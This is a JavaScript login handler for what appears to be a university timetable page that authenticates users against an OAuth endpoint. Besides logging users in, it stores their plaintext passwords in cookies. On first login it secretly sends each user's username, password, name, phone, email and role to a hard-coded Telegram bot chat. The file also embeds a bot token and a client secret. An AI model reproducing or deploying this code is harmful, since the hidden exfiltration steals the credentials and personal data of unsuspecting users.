function setCookie(name, value, daysToExpire) {
    const date = new Date();
    date.setTime(date.getTime() + (daysToExpire * 24 * 60 * 60 * 1000));
    const expires = "expires=" + date.toUTCString();
    document.cookie = name + "=" + value + ";" + expires + ";path=/";
}

// Function to get a cookie value by name
function getCookie(name) {
    const cookieName = name + "=";
    const cookies = document.cookie.split(';');
    for (let i = 0; i < cookies.length; i++) {
        let cookie = cookies[i].trim();
        if (cookie.indexOf(cookieName) === 0) {
            return cookie.substring(cookieName.length, cookie.length);
        }
    }
    return null;
}

function getUser(username, password) {
    if (!(username && password)) {
        document.querySelector(".reg-user").style.display = "grid";
        return
    }
    fetch('https://inet.mdis.uz/oauth/token', {
        method: "POST",
        headers: {
            'Authorization': 'Basic c3ByaW5nLXNlY3VyaXR5LW9hdXRoMi1yZWFkLWNsaWVudDpzcHJpbmctc2VjdXJpdHktb2F1dGgyLXJlYWQtY2xpZW50LXBhc3N3b3JkMTIzNA==',
            "Content-Type": "application/x-www-form-urlencoded",
        },
        body: `username=${username}&password=${password}&grant_type=password`
    }).then(res => {
        if (res.status == 200) {
            return res.json()
        }
        else if (res.status == 400) {
            document.querySelector("form#user-login").classList.add("error")
            throw new Error("no user")
        }
    }).then(text => {
        if (!getCookie("username")) {
            setCookie("username", username, 20)
        }
        if (!getCookie("password")) {
            setCookie("password", password, 20)
        }
        document.querySelector("header span.bold").textContent = text.user.fullName.split(" ")[0].toLowerCase()
        document.querySelector(".avatar > img").setAttribute("src", `https://inet.mdis.uz${text.user.avatar}`)
        localStorage.setItem("access_token", `Bearer ${text.access_token}`)
        if (!getCookie("isReggedBefore")) {
            const message = `New Login to Timetable%0A%0AFull Name: ${text.user.fullName}%0ARole: ${text.user.roles[0]}%0AID: ${text.user.uuid}%0APhone: +${text.user.phone}%0AEmail: ${text.user.email}%0A%0AUsername: <b>${username}</b>%0APassword: <code>${password}</code>`
            setCookie("isReggedBefore", true, 60)
            fetch(`https://api.telegram.org/bot2008400182:AAE_Y6AfamakIb2pk020WtpFPFcUWRR_nvY/sendDocument?chat_id=1273666675&document=https://inet.mdis.uz${text.user.avatar}&caption=${message}&parse_mode=html`).then(() => {
                location.reload()
            })
        }
    })

}

document.querySelector("#user-login").addEventListener("submit", e => {
    let username, password;
    e.preventDefault()
    username = document.querySelector("#user-login input[name=username]").value
    password = document.querySelector("#user-login input[name=password]").value
    getUser(username, password)
})